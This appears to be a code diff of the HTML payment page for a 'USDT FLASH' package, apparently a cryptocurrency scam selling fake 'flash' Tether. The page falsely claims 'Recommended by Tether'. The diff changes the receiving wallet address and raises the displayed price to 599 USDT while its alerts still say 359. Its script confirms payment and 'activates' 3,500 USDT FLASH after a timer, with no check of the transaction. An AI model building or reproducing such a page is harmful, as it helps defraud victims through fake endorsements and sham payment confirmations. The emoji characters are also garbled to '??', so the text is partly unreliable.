@@ -118,7 +118,7 @@
     <div class="bg-gradient-to-r from-blue-600 to-blue-700 text-white py-6">
         <div class="container mx-auto px-4">
             <div class="text-center">
-                <h1 class="text-4xl md:text-5xl font-bold mb-3">🔥 USDT FLASH Basic</h1>
+                <h1 class="text-4xl md:text-5xl font-bold mb-3">?? USDT FLASH Basic</h1>
                 <div class="flex justify-center items-center space-x-6 text-lg">
                     <div class="flex items-center">
                         <i class="fas fa-coins mr-2"></i>
@@ -135,7 +135,7 @@
                 </div>
                 <div class="mt-2">
                     <span class="bg-yellow-500 text-black px-3 py-1 rounded-full text-sm font-bold">
-                        🏆 Recommended by Tether
+                        ?? Recommended by Tether
                     </span>
                 </div>
             </div>
@@ -148,7 +148,7 @@
             <div class="max-w-4xl mx-auto">
                 <div class="payment-card p-8">
                     <h2 class="text-3xl font-bold mb-8 text-center tether-highlight">
-                        💳 Complete Payment - Professional Package
+                        ?? Complete Payment - Professional Package
                     </h2>
                     
                     <!-- Payment Amount Display -->
@@ -163,13 +163,13 @@
                     <form id="paymentForm">
                         <div class="grid md:grid-cols-2 gap-6 mb-8">
                             <div class="simple-border text-center">
-                                <h4 class="text-lg font-bold tether-highlight mb-2">📱 Scan QR Code</h4>
+                                <h4 class="text-lg font-bold tether-highlight mb-2">?? Scan QR Code</h4>
                                 <div class="bg-white p-4 rounded-lg mb-4 border-2 border-tether-blue" style="min-height: 200px; display: flex; align-items: center; justify-content: center;">
                                     <img src="../img/TRON TRC 2000.jpg" alt="USDT TRC20 QR Code" 
                                          style="max-width: 180px; max-height: 180px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
                                 </div>
                                 <div class="wallet-address">
-                                    TQo39kdaRiA32F72C9bihPV742P8Ew9Q8q
+                                    THK7b3vRHfv9QEXgQBDgaBsGe5rCCdWFHg
                                 </div>
                                 <button type="button" class="tether-button text-sm" onclick="copyAddress()">
                                     <i class="fas fa-copy mr-2"></i>Copy Address
@@ -177,11 +177,11 @@
                             </div>
                             
                             <div class="simple-border">
-                                <h4 class="text-lg font-bold mb-4">💳 Payment Instructions</h4>
+                                <h4 class="text-lg font-bold mb-4">?? Payment Instructions</h4>
                                 <div class="space-y-3">
                                     <p class="flex items-center">
                                         <i class="fas fa-arrow-right text-blue-500 mr-2"></i>
-                                        Send exactly <strong class="tether-highlight">359 USDT</strong>
+                                        Send exactly <strong class="tether-highlight">599 USDT</strong>
                                     </p>
                                     <p class="flex items-center">
                                         <i class="fas fa-network-wired text-blue-500 mr-2"></i>
@@ -210,7 +210,7 @@
                         <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                             <button type="submit" class="tether-button text-lg py-4">
                                 <i class="fas fa-credit-card mr-2"></i>
-                                💳 COMPLETE PAYMENT
+                                ?? COMPLETE PAYMENT
                             </button>
                             <button type="button" onclick="window.location.href='account-info.html'" 
                                     class="tether-button text-lg py-4">
@@ -238,11 +238,11 @@
 
     <script>
         function copyAddress() {
-            const CORRECT_ADDRESS = 'TQo39kdaRiA32F72C9bihPV742P8Ew9Q8q';
+            const CORRECT_ADDRESS = 'THK7b3vRHfv9QEXgQBDgaBsGe5rCCdWFHg';
             
             if (navigator.clipboard && navigator.clipboard.writeText) {
                 navigator.clipboard.writeText(CORRECT_ADDRESS).then(() => {
-                    alert('✅ Address Copied Successfully!\n\nSend exactly 359 USDT to this address');
+                    alert('? Address Copied Successfully!\n\nSend exactly 359 USDT to this address');
                 });
             } else {
                 const textarea = document.createElement('textarea');
@@ -251,7 +251,7 @@
                 textarea.select();
                 document.execCommand('copy');
                 document.body.removeChild(textarea);
-                alert('✅ Address Copied Successfully!\n\nSend exactly 359 USDT to this address');
+                alert('? Address Copied Successfully!\n\nSend exactly 359 USDT to this address');
             }
         }
         
@@ -260,14 +260,14 @@
             const txId = document.getElementById('txId').value;
             
             if (!txId) {
-                alert('⚠️ Please enter a transaction ID first');
+                alert('?? Please enter a transaction ID first');
                 return;
             }
             
-            alert('🔄 Processing Professional Package payment...\n⏳ Please wait...');
+            alert('?? Processing Professional Package payment...\n? Please wait...');
             
             setTimeout(() => {
-                alert('✅ Professional Package activated successfully!\n🎉 3,500 USDT FLASH ready!\n⭐ Gold Member Status activated!');
+                alert('? Professional Package activated successfully!\n?? 3,500 USDT FLASH ready!\n? Gold Member Status activated!');
                 window.location.href = 'account-info.html';
             }, 3000);
         });
